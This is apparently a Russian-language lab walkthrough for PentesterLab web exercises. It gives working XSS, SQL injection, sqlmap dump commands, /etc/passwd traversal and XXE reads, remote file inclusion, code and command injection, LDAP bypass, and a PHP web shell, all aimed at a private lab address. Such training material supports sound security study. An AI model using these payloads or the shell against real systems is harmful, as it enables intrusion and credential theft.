Character	URL encoded value
\r		%0d
\n		%0a
\t		%09
		%20 or `+`
?		%3f
&		%26
=		%3d
;		%3b
#		%23
%		%25


XSS
1. <script>alert(1)</script>
2. <ScripT>alert(1)</SCriPT>
3. <sc<script>ript>alret(1)</sc</script>ript>
4. <img src='zzzz' onerror='alert(1)'/>
5. <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
6. "; alert(1) //
7. ' ; alert('XSS') //
8. /xss/example8.php/"><script>prompt('aqwe')</script>
9. <svg/onload=alert(‘xss’)>

SQL
Пробелы можно экранировать: %09, /**/
1. Проверки:
name=root' and '1'='1
name=root' and '1'='1' %23
name=root' and 1=1 %23
name=root' #

name=root' and '1'=0
name=root' and '1'='1
name=root' or '1'='1
name=root' or '1'='1' %23

2. Обход фильтрации
name=root%09'%09or%09'1'='1%09
Просмотр базы
name=root%09'%09%09'1'='0%09

3. Просмотр базы
name=root/**/'/**//**/'1'='0/**/

4. Просмотр базы
Выполняются математические операции с цифрами


5. Просмотр базы
Выполняются только математические операции вычитания. Сложение экранирование.
Проверка которая обходится
if (!preg_match('/^[0-9]+/', $_GET["id"])) {
    die("ERROR INTEGER REQUIRED");  
}

6. Просмотр базы
Ошибка в базе. Если длинные значения не подходять перепроверяем 1=1 
id=2134 or 1=1

Проверка которая обходится
if (!preg_match('/[0-9]+$/', $_GET["id"])) {
    die("ERROR INTEGER REQUIRED");  
}

7. Просмотр базы

Проверка которая обходится
if (!preg_match('/^-?[0-9]+$/m', $_GET["id"])) {
  die("ERROR INTEGER REQUIRED");    
}

http://192.168.93.131/sqli/example7.php?id=2%0a%20or%201=1
http://192.168.93.131/sqli/example7.php?id=2%20or%20123=%0a123
http://192.168.93.131/sqli/example7.php?id=2%20or%20%0A123=%0A123

8. Запрос скопировали в файл.
Команда SQLMap для тестирования уязвимого параметра:
python .\sqlmap.py -r .\request.txt -p order --level=5 --risk=3
Y
y

Команда SQLMap для просмотра таблиц:
python .\sqlmap.py -r .\request.txt -p order --level=5 --risk=3 --tables

Команда SQLMap для просмотра контента:
python .\sqlmap.py -r .\request.txt -p order  --level=5 --risk=3 --tables --dump -T users -D exercises

9. Запрос скопировали в файл.
Команда SQLMap для тестирования уязвимого параметра:
python .\sqlmap.py -r .\request.txt -p order --level=5 --risk=3
Y
y

Команда SQLMap для просмотра таблиц:
python .\sqlmap.py -r .\request.txt -p order --level=5 --risk=3 --tables

Команда SQLMap для просмотра контента:
python .\sqlmap.py -r .\request.txt -p order  --level=5 --risk=3 --tables --dump -T users -D exercises


File include
1. Тестирование на появление ошибки - используем кавычку
	Path traversal http://192.168.93.131/fileincl/example1.php?page=../../../../etc/passwd
  	File inclusion http://192.168.93.131/fileincl/example1.php?page=http://assets.pentesterlab.com/test_include.txt
Подгружаем для тестирования файл с phpinfo(), который выполняется если подгрузить его с удалённого ресурса

2. Нужно добавить NULL BYTE в конце строки. 
	http://192.168.93.131/fileincl/example2.php?page=http://assets.pentesterlab.com/test_include.txt%00

Code injection
1. Исполнение кода. Используем конкатенцию строк.  В конце нужно добавлять комментарий // или #
	http://192.168.93.131/codeexec/example1.php?name=hacker%22.system(%27uname%20-a%27);%23
	http://192.168.93.131/codeexec/example1.php?name=hacker%22.system(%27uname%20-a%27);//

2. Функция usort используется обычно вместе с create_function. В таком случае нужно завершить функцию, закрыть фигурную скобку и прописать команду и поставить комментарий после
	http://192.168.93.131/codeexec/example2.php?order=id);}system(%27uname%20-a%27);//

3. Используется при паттернах PCRE_REPLACE_EVAL (/e) позволяет исполнить команду, которая передаётся.
	http://192.168.93.131/codeexec/example3.php?new=phpinfo()&pattern=/lamer/e&base=Hello%20lamer
	http://192.168.93.131/codeexec/example3.php?new=system('uname -a')&pattern=/lamer/e&base=Hello%20lamer

4. Эта уязвимость основывается на функции assert(). Когда функция используется для получения исполняемого кода
	http://192.168.93.131/codeexec/example4.php?name=hacker%27.phpinfo().%27

Command injection
1. В командную строку добавляем команду Linux. Кодируем символ &.
	http://192.168.93.131/commandexec/example1.php?ip=127.0.0.1%26cat%20/etc/passwd

2. Здесь в качестве разделителя применяется применяется перенос строки %0a
	http://192.168.93.131/commandexec/example2.php?ip=127.0.0.1%0acat%20/etc/passwd

3. В этом примере барпсьют используем репитер и всталяем команду для проверки.
	GET /commandexec/example3.php?ip=127.0.0.1|uname+-a HTTP/1.1
	Host: 192.168.93.131
	User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
	Accept-Encoding: gzip, deflate
	Referer: http://192.168.93.131/
	Connection: close
	Upgrade-Insecure-Requests: 1

LDAP injection
1. Функция аутентификации использует ldap_bind. Если в неё отправить нулевые пустые знанчения - то получается обход авторизации
	http://192.168.93.131/ldap/example1.php

2. Задача получить доступ к системе. a* - означает, что будут перебираться все значения начиная с символа а, пока не найдёт существующее.
В этой таске используется доступ (&(cn=[INPUT1])(cn=[INPUT2])), то есть каждый символ отвечает за порядковый параметр.
Параметр пароля хешируется и таким образом можно играть только с первым параметром.
Нулевой байт ознаечает конец функции - %00
	http://192.168.93.131/ldap/example2.php?name=a*)(cn=*))%00&password=hacker

File upload
1. Записываем в .php простой исполняемый скрипт, где "cmd" - параметр. После того как файл был загружен, вводим url с параметром, которому передаём команду серверу.
<?php
  system($_GET["cmd"]);
?>
	http://192.168.93.131/upload/images/test.php?cmd=cat%20/etc/passwd

2. В этой задаче используется фильтр, который не пропускает файл с расширением .php. Таким образом можно добавить .php3 или .php.bka - это позволяет обходить фильтры.
После того как файл загружен, вводим url с параметром, где в расширении файла удалено всё лишнее.

	http://192.168.93.131/upload/images/test.php?cmd=cat%20/etc/passwd

XML related attacks
1. http://192.168.93.131/xml/example1.php?xml=%3c%21%44%4f%43%54%59%50%45%20%66%6f%6f%20%5b%3c%21%45%4c%45%4d%45%4e%54%20%66%6f%6f%20%41%4e%59%3e%3c%21%45%4e%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4d%20%22%66%69%6c%65%3a%2f%2f%2f%2f%65%74%63%2f%70%61%73%73%77%64%22%3e%5d%3e%3c%66%6f%6f%3e%26%78%78%65%3b%3c%2f%66%6f%6f%3e
XML нужно кодировать

2. http://192.168.93.131/xml/example2.php?name=%27%20or%201=1]%00
